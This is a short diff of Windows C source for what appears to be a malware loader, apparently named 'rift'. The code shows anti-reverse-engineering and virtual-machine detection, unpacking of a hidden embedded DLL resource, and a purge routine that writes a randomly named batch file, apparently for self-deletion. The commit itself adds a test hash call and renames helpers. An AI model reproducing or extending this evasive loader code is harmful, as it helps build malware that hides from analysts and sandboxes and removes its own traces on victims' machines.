@@ -15,6 +15,10 @@ INT WINAPI wWinMain(
 	GetCurrentDirectoryW(MAX_PATH, g_szCD);
 	g_hPH = GetProcessHeap();
 
+	// Test
+	PVOID md5 = fnMD5HashData(L"Dhgdwahmdnwadjhd", 16);
+	HeapFree(g_hPH, 0, md5);
+
 #ifndef _DEBUG
 	// Protect Process
 	BOOL bRE = fnAntiRE();
@@ -25,6 +29,7 @@ INT WINAPI wWinMain(
 
 	BOOL bVM = fnCheckVMPresent();
 
+//	fnSetWrapFileName(L"RIFTKEY");
 	SIZE_T nDll;
 	PVOID pDll = fnUnpackResource(L"_rift.KEY", IDR_RIFTDLL, &nDll);
 	if (!pDll)
@@ -73,7 +78,7 @@ VOID fnPurge() {
 	// Prepare String for Filename of Batchfile
 	PWSTR szFilePath = (PWSTR)HeapAlloc(g_hPH, 0, MAX_PATH);
 	SIZE_T nRandom;
-	PCWSTR szRandom = fnAllocRandomStringW(8, 16, &nRandom);
+	PCWSTR szRandom = fnAllocRandomPathW(8, 16, &nRandom);
 	CopyMemory(szFilePath, g_szCD, MAX_PATH);
 	PathCchAppend(szFilePath, MAX_PATH, szRandom);
 	PathCchAddExtension(szFilePath, MAX_PATH, L".bat");
@@ -92,6 +97,6 @@ VOID fnPurge() {
 	HeapFree(g_hPH, 0, pScriptW);
 
 	// Write to Disk
-	fnWriteFileW(szFilePath, pScriptA, nScript);
+	fnWriteFileCW(szFilePath, pScriptA, nScript);
 	HeapFree(g_hPH, 0, pScriptA);
 }
